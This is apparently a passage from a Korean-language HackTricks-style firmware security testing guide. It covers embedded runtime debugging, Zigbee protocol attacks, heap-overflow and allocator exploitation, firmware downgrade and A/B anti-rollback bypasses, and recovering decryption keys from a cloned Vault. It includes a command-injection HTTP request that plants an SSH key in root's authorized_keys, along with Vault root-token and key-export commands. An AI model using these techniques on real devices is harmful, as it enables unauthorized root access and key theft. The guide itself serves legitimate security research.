반복 가능한 오류 격리를 위해 안정적으로 쓰기 가능한 볼륨에 타임스탬프가 포함된 마커 파일을 기록하고 오프라인에서 확인하세요. `/dev/kmsg`, FIFO, 일시적인 콘솔은 속도 제한이나 프로세스의 조기 종료로 인해 오탐을 일으킬 수 있습니다. 또한 관련 없는 코드를 변경하기 전에 각 계층의 인터페이스가 정확히 일치하는지 비교하세요. 예를 들어 `uname -r`과 `/lib/modules/`, 디스크에 저장된 ext4 기능과 커널 설정, Mesa `libGL`의 세대와 DRI 드라이버 ABI 및 PCI에서 파생된 드라이버 이름을 비교합니다. 구성 요소가 존재하고 `dlopen()`에도 성공하더라도, 이를 사용하는 쪽에서 다른 ABI를 기대하면 사용할 수 없습니다.<sup>[[11]](#references)</sup>

## 실제 동적 분석

이 단계에서는 실제 장치 환경이나 에뮬레이션된 장치 환경을 분석에 사용합니다. OS와 파일시스템에 대한 셸 접근을 유지하는 것이 중요합니다. 에뮬레이션은 하드웨어 상호작용을 완벽하게 재현하지 못할 수 있으므로, 에뮬레이션을 간혹 다시 시작해야 할 수 있습니다. 분석 과정에서 파일시스템을 다시 살펴보고, 노출된 웹페이지와 네트워크 서비스를 악용하고, 부트로더 취약점을 탐색해야 합니다. 잠재적인 백도어 취약점을 식별하려면 펌웨어 무결성 테스트가 중요합니다.

## 런타임 분석 기법

런타임 분석은 gdb-multiarch, Frida, Ghidra 같은 도구를 사용해 프로세스나 바이너리가 실행되는 환경에서 상호작용하는 과정입니다. 여기에는 중단점을 설정하고 퍼징 등의 기법으로 취약점을 식별하는 작업이 포함됩니다.

완전한 디버거가 없는 임베디드 대상에서는 **정적으로 링크된 `gdbserver`를 장치에 복사한 뒤 원격으로 연결하세요**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor 메시지 매핑

IoT 허브에서는 RF 스택이 **radio MCU**와 Linux 사용자 공간 프로세스로 분리되어 있는 경우가 많습니다. 다음 경로를 매핑하는 것이 유용합니다:<sup>[[8]](#references)</sup>

1. 무선상의 **RF frame**
2. radio MCU의 **controller-side parser**
3. Linux로 전달되는 **serial/UART text 또는 TLV protocol** (예: `/dev/tty*`)
4. 메인 데몬의 **application dispatcher**
5. **protocol-specific handler / state machine**

이 아키텍처에서는 리버싱 대상이 하나가 아니라 두 개가 됩니다. 컨트롤러가 바이너리 무선 프레임을 `Group,Command,arg1,arg2,...`와 같은 텍스트 프로토콜로 변환한다면 다음을 알아내세요.

- **message groups**와 dispatch table
- 어떤 메시지가 **network**에서 올 수 있고 어떤 메시지가 컨트롤러 자체에서 오는지
- 정확한 **manufacturer-specific discriminator field** (예: Zigbee의 `manufacturer_code` 및 사용자 지정 `cluster_command`)
- **commissioning**, discovery 또는 firmware/model download 단계에서만 도달 가능한 handler

Zigbee의 경우 pairing 트래픽을 캡처하고 대상이 아직 기본 **Link Key** `ZigBeeAlliance09`에 의존하는지 확인하세요. 그렇다면 commissioning 트래픽을 스니핑해 **Network Key**를 알아낼 수 있습니다. Zigbee 3.0 install code는 이러한 노출을 줄여 주므로, 테스트 대상 장치에서 실제로 이를 적용하는지 확인하세요.

### Manufacturer-specific protocol handler와 FSM으로 제어되는 도달 가능성

Vendor-specific Zigbee/ZCL command는 표준 cluster보다 더 좋은 공격 대상인 경우가 많습니다. 검증이 충분히 이뤄지지 않은 **custom parsing code**와 내부 **FSM**으로 이어지기 때문입니다.<sup>[[8]](#references)</sup>

실용적인 작업 흐름:

- command dispatcher를 리버싱해 **vendor-only handler**를 찾습니다.
- **FSM state**, **event**, **check**, **action**, **next-state** table을 알아냅니다.
- 자동으로 다음 단계로 진행되는 **transitional state**와, 궁극적으로 attacker-controlled state를 초기화하거나 해제하는 retry/error 분기를 식별합니다.
- 버그가 있는 handler에 항상 도달할 수 있다고 가정하지 말고, 데몬을 취약한 상태로 전환하기 위해 필요한 정상적인 protocol exchange를 확인합니다.

타이밍에 민감한 protocol에서는 Python framework를 통한 packet replay가 너무 느릴 수 있습니다. 더 안정적인 방법은 vendor급 stack을 사용해 실제 하드웨어(예: **nRF52840**)에서 정상 장치를 에뮬레이션하여 올바른 **endpoint**, **attribute**, commissioning 타이밍을 맞추는 것입니다.

### 임베디드 데몬의 fragmented-download 버그 유형

**fragmented blob/model/configuration download**에서 반복적으로 나타나는 firmware 버그 유형은 다음과 같습니다.<sup>[[8]](#references)</sup>

1. **첫 번째 fragment** (`offset == 0`)에서 `ctx->total_size`를 저장하고 `malloc(total_size)`로 메모리를 할당합니다.
2. 이후 fragment에서는 `packet_total_size >= offset + chunk_len` 같은 공격자가 제어하는 **packet-local** field만 검증합니다.
3. 복사할 때 원래 할당된 크기와 비교하지 않고 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`을 사용합니다.

이로 인해 공격자는 다음을 보낼 수 있습니다.

- **작은** 선언된 total size로 유효한 첫 fragment를 보내 작은 heap 할당을 유도합니다.
- **예상된 offset**을 사용하되 더 큰 `chunk_len`을 가진 후속 fragment를 보냅니다.
- 새 검증은 통과하면서 원래 할당된 buffer는 여전히 넘치도록 packet-local size를 위조합니다.

취약한 경로가 commissioning 로직 뒤에 있다면, 잘못된 fragment를 보내기 전에 대상이 예상된 model-download 또는 blob-download 상태로 진입하도록 충분한 **device emulation**을 포함해야 합니다.

### Protocol로 유발하는 `free()` 트리거

임베디드 데몬에서는 heap metadata 악용을 유발하기 위해 "정리될 때까지 기다리는" 것보다 protocol의 자체 오류 처리를 **강제하는** 편이 더 쉬운 경우가 많습니다.<sup>[[8]](#references)</sup>

- 잘못된 후속 fragment를 보내 FSM을 **retry** 또는 **error** 상태로 전환합니다.
- retry 임계값을 초과해 데몬이 **context를 초기화**하고 손상된 buffer를 해제하도록 합니다.
- 예측 가능한 이 `free()`를 이용해 관련 없는 이유로 프로세스가 crash하기 전에 allocator 측 primitive를 실행합니다.

이는 임베디드 Linux의 **musl/uClibc/dlmalloc 계열** allocator를 공격할 때 특히 유용합니다. chunk metadata를 손상시키면 unlink/unbin 로직을 write primitive로 바꿀 수 있습니다. 안정적인 패턴은 실제 bin pointer를 바로 덮어써 프로세스를 crash시키는 대신, **size field**를 손상시켜 allocator의 탐색을 overflow된 buffer 안에 배치한 **fake chunk**로 유도하는 것입니다.

## Binary Exploitation 및 Proof-of-Concept

식별된 취약점의 PoC를 개발하려면 대상 아키텍처에 대한 깊은 이해와 저수준 언어 프로그래밍 능력이 필요합니다. 임베디드 시스템에서는 바이너리 런타임 보호 기능이 드물지만, 적용된 경우 Return Oriented Programming (ROP) 같은 기법이 필요할 수 있습니다.

### uClibc fastbin exploitation 참고 사항 (임베디드 Linux)

- **Fastbin 및 consolidation:** uClibc는 glibc와 유사한 fastbin을 사용합니다. 이후의 큰 메모리 할당으로 `__malloc_consolidate()`가 실행될 수 있으므로, fake chunk는 검사 조건(정상적인 size, `fd = 0`, 주변 chunk가 "in use"로 인식됨)을 통과해야 합니다.<sup>[[6]](#references)</sup>
- **ASLR이 적용된 non-PIE 바이너리:** ASLR이 활성화되어 있어도 메인 바이너리가 **non-PIE**라면 바이너리 내부의 `.data/.bss` 주소는 안정적입니다. 이미 유효한 heap chunk header와 비슷한 영역을 대상으로 하여 fastbin 할당이 **function pointer table**에 도달하도록 할 수 있습니다.
- **Parser를 중단시키는 NUL:** JSON을 파싱할 때 payload의 `\x00`은 파싱을 중단시키면서 뒤에 이어지는 공격자 제어 byte는 stack pivot/ROP chain에 사용할 수 있도록 남겨 둘 수 있습니다.
- **`/proc/self/mem`을 통한 shellcode:** `open("/proc/self/mem")`, `lseek()`, `write()`를 호출하는 ROP chain으로 알려진 mapping에 실행 가능한 shellcode를 심고 그 위치로 jump할 수 있습니다.

## Firmware Analysis용 사전 구성 운영체제

[AttifyOS](https://github.com/adi0x90/attifyos) 및 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 같은 운영체제는 firmware 보안 테스트에 필요한 도구를 갖춘 사전 구성 환경을 제공합니다.

## Firmware 분석용 사전 구성 OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS는 사물 인터넷(IoT) 장치의 보안 평가 및 penetration testing을 지원하도록 설계된 배포판입니다. 필요한 도구가 모두 로드된 사전 구성 환경을 제공해 많은 시간을 절약해 줍니다.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware 보안 테스트 도구가 미리 설치된 Ubuntu 18.04 기반 임베디드 보안 테스트 운영체제입니다.

## Firmware Downgrade Attack 및 안전하지 않은 Update Mechanism

vendor가 firmware image에 대한 암호화 서명 검사를 구현했더라도 **version rollback (downgrade) 보호 기능은 자주 빠져 있습니다**. boot 또는 recovery loader가 내장된 public key로 서명만 확인하고 플래시할 image의 *version* (또는 monotonic counter)은 비교하지 않으면, 공격자는 서명은 유효하지만 취약한 **구형 firmware를 정상적으로 설치**해 패치된 취약점을 다시 노출시킬 수 있습니다.<sup>[[4]](#references)</sup>

일반적인 공격 절차:

1. **서명된 구형 image 확보**
   * vendor의 공개 download portal, CDN 또는 support site에서 가져옵니다.
   * 관련 모바일/데스크톱 애플리케이션에서 추출합니다 (예: Android APK의 `assets/firmware/` 내부).
   * VirusTotal, Internet archive, forum 등의 타사 저장소에서 가져옵니다.
2. 노출된 update channel을 통해 image를 장치에 **업로드하거나 제공합니다**.
   * Web UI, 모바일 앱 API, USB, TFTP, MQTT 등
   * 많은 소비자용 IoT 장치는 Base64로 인코딩된 firmware blob을 받아 서버 측에서 디코딩하고 recovery/upgrade를 시작하는 *인증되지 않은* HTTP(S) endpoint를 노출합니다.
3. downgrade한 후, 최신 release에서 패치된 취약점을 악용합니다 (예: 이후에 추가된 command-injection filter).
4. 선택적으로 최신 image를 다시 플래시하거나 update를 비활성화해, persistence를 확보한 뒤 탐지를 피합니다.

### 예시: Downgrade 이후의 Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

취약한(다운그레이드된) firmware에서는 `md5` 매개변수가 정화 과정 없이 shell command에 직접 연결되어 임의의 command를 주입할 수 있습니다(여기서는 SSH key 기반 root access를 활성화). 이후 firmware 버전에서는 기본적인 문자 필터를 도입했지만, downgrade protection이 없어 이 수정은 무용지물입니다.<sup>[[4]](#references)</sup>

### 모바일 앱에서 Firmware 추출하기

많은 공급업체는 앱이 Bluetooth/Wi-Fi를 통해 기기를 업데이트할 수 있도록 전체 firmware 이미지를 관련 모바일 애플리케이션에 함께 제공합니다. 이러한 패키지는 흔히 APK/APEX의 `assets/fw/` 또는 `res/raw/` 같은 경로에 암호화되지 않은 상태로 저장됩니다. `apktool`, `ghidra`, 심지어 기본 `unzip` 같은 도구를 사용하면 물리적 하드웨어를 건드리지 않고도 서명된 이미지를 추출할 수 있습니다.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot 설계에서 updater 전용 anti-rollback 우회

일부 벤더는 anti-downgrade **ratchet**을 구현하지만, *updater* 로직 내부에서만 구현합니다(예: CAN을 통한 UDS 루틴, recovery 명령 또는 userspace OTA agent). 이후 **bootloader**가 이미지 서명/CRC만 확인하고 partition table이나 slot metadata를 신뢰한다면, rollback protection을 여전히 우회할 수 있습니다.<sup>[[7]](#references)</sup>

일반적인 취약 설계:

- Firmware metadata에 버전 descriptor와 **security ratchet** / monotonic counter가 모두 포함됩니다.
- Updater는 이미지 ratchet을 persistent storage에 저장된 값과 비교해 이전 버전의 서명된 이미지를 거부합니다.
- Bootloader는 해당 ratchet을 파싱하지 않고, 부팅 전에 선택된 slot의 header, CRC, signature만 검증합니다.
- Slot 활성화 정보는 partition table이나 slot별 generation counter에 따로 저장되며, 검증된 정확한 firmware digest와 **암호학적으로 연결되지 않습니다**.

이로 인해 dual-slot 시스템에서 **하나의 이미지를 검증하고 다른 이미지를 부팅하는** 원시 기능이 생깁니다. 공격자가 updater가 최신 서명된 이미지를 사용해 slot B를 다음 부팅 대상으로 지정하도록 한 뒤 재부팅 전에 slot B를 덮어쓸 수 있다면, bootloader는 이미 커밋된 slot metadata만 신뢰하기 때문에 이전 버전 이미지를 부팅할 수 있습니다.

일반적인 악용 패턴:

1. **최신 서명된** firmware를 비활성 slot에 업로드하고, 일반적인 검증/전환 루틴을 실행해 해당 slot이 다음 활성 slot으로 표시되도록 합니다.
2. **아직 재부팅하지 않습니다**. 같은 세션에서 slot 준비/삭제 루틴을 다시 실행합니다.
3. 오래된 boot-state 또는 slot-selection 로직을 악용해 updater가 방금 활성화한 **동일한 물리 slot**을 삭제하도록 합니다.
4. 해당 slot에 **이전 버전이지만 여전히 서명된** firmware를 씁니다.
5. ratchet을 적용하는 검증 루틴을 건너뛰고 바로 재부팅합니다.
6. Bootloader는 활성화된 slot을 선택해 signature/integrity만 검증하고 이전 이미지를 부팅합니다.

A/B update 구현을 reverse engineering할 때 확인할 사항:

- 성공적인 전환 이후 갱신되지 않는 **부팅 시점 플래그**에서 slot 선택 정보를 가져오는지 확인합니다.
- `prepare_passive_slot()` 유형의 루틴이 **현재 커밋된 layout** 대신 오래된 상태를 기준으로 slot을 삭제하는지 확인합니다.
- `part_write_layout()` 유형의 함수가 검증된 image hash를 저장하지 않고 **generation counter** / active flag만 갱신하는지 확인합니다.
- Ratchet 검사가 userspace 또는 updater 코드에만 있고 ROM / bootloader / secure boot 단계에는 없는지 확인합니다.
- 삭제 또는 recovery 루틴이 slot의 콘텐츠를 지우고 다시 쓴 뒤에도 해당 slot을 부팅 가능 상태로 남기는지 확인합니다.

### Update 로직 평가 체크리스트

* *Update endpoint*의 전송/인증이 충분히 보호되는가(TLS + authentication)?
* Flashing 전에 기기가 **버전 번호** 또는 **monotonic anti-rollback counter**를 비교하는가?
* 이미지가 secure boot chain 내부에서 검증되는가(예: ROM 코드가 서명을 확인하는가)?
* **Bootloader가 updater와 동일한 ratchet을 적용하는가**, 아니면 signature/CRC만 확인하는가?
* Slot 활성화 metadata가 **검증된 firmware digest/version에 연결되어 있는가**, 아니면 활성화 후 slot을 수정할 수 있는가?
* Slot 전환이 성공하면 기기가 강제로 재부팅되는가, 아니면 같은 세션에서 후속 update/erase 루틴을 계속 실행할 수 있는가?
* Userland 코드가 추가적인 무결성 검사를 수행하는가(예: 허용된 partition map, model number)?
* *부분* 또는 *백업* update 흐름에서도 동일한 검증 로직을 사용하는가?

> 💡 위 항목 중 빠진 것이 있다면, 해당 플랫폼은 rollback 공격에 취약할 가능성이 높습니다.

## 실습용 취약 firmware

Firmware의 취약점을 찾는 연습을 하려면 다음 취약 firmware 프로젝트를 시작점으로 사용하세요.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 임베디드 KMS/Vault 상태에서 firmware 복호화 키 복구

Update 이미지에 작은 plaintext metadata와 대용량 high-entropy blob이 섞여 있다면, 무차별 대입을 시도하기 전에 컨테이너를 먼저 분석하세요:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d`, `binwalk -E`를 사용해 header, offset, 줄 경계를 덤프합니다.
- `Salted__`는 대개 OpenSSL `enc` 형식을 의미합니다. 다음 8바이트는 salt이고 나머지 바이트는 ciphertext입니다.
- Base64 필드를 디코딩한 결과가 정확히 `256`바이트라면, RSA-2048 ciphertext로 임의의 firmware password/session key를 감싼 것일 가능성이 높습니다.
- 같은 파일의 detached PGP 데이터는 인증만 보호하는 경우가 많으므로, 기밀성을 제공하는 방식이라고 단정하지 마세요.

정적 키 탐색(`grep`, `strings`, PEM/PGP 검색)에 실패했다면, private key만 계속 찾지 말고 **실제 복호화 경로**를 reverse engineering하세요.

- Updater / management binary를 decompile하고, 암호화된 blob을 읽는 주체와 이를 풀어내는 helper/API, 그리고 요청하는 논리적 key name을 추적합니다.
- 추출한 root filesystem에서 KMS 상태(`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`)와 unit 파일, init script를 검색합니다.
- 평문 `vault operator unseal ...`, recovery key, bootstrap token 또는 로컬 KMS auto-unseal script는 private key 자료와 동일하게 취급합니다.

제품에 원본 Vault binary와 storage backend가 포함되어 있다면, Vault 내부를 다시 구현하는 것보다 해당 환경을 재현하는 편이 보통 더 쉽습니다:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

KMS를 clone한 환경에서 root 권한으로:

- transit key를 격리된 clone 내부에서만 export할 수 있도록 설정합니다: `vault write transit/keys/<name>/config exportable=true`
- unwrap key를 export합니다: `vault read transit/export/encryption-key/<name>`
- 복구한 RSA key에 KMS에서 사용한 정확한 padding/hash 조합을 적용해 봅니다. PKCS#1 v1.5 복호화와 기본 OAEP 복호화에 실패했다고 해서 key가 잘못된 것은 아닙니다. Vault 기반 흐름은 OAEP에 SHA-256을 사용하는 경우가 많지만, 일반적인 라이브러리는 기본값으로 SHA-1을 사용합니다.
- payload가 `Salted__`로 시작하면 AES-CBC 복호화를 시도하기 전에 vendor의 OpenSSL KDF(`EVP_BytesToKey`, 구형 appliance에서는 MD5를 사용하는 경우가 많음)를 정확히 재현합니다.

이렇게 하면 "encrypted firmware"는 더 일반적인 문제로 바뀝니다. **appliance 측 운영 key를 복구한 다음, 정확한 unwrap + KDF 매개변수를 오프라인에서 재현하면 됩니다.**

## 교육 및 자격증

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude로 펌웨어 크래킹하기: 시니어급 기술, 주니어급 자율성](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [펌웨어 보안 테스트 방법론](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [실전 IoT 해킹: 사물 인터넷 공격을 위한 결정판 가이드](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [방치된 하드웨어의 zero-day 취약점 악용 – Trail of Bits 블로그](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20달러짜리 스마트 기기로 집에 접근한 방법](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [이제 mi가 보이네요: 이제 당신은 Pwned되었습니다](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 충전 포트 커넥터를 통한 Tesla Wall Connector 악용 - Part 2: anti-downgrade 우회](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [깜빡이게 만들기: Philips Hue Bridge의 Over-the-Air 악용](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU에서 Tesla OS ROOT하기 Part 1: 압축 해제](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel 문서 - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU에서 Tesla OS ROOT하기 Part 2: 디버깅 및 수정](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS 암호: 취약한 XOR 암호화로 SPI Flash에서 암호 복구 가능 (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS 암호 복구 도구](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
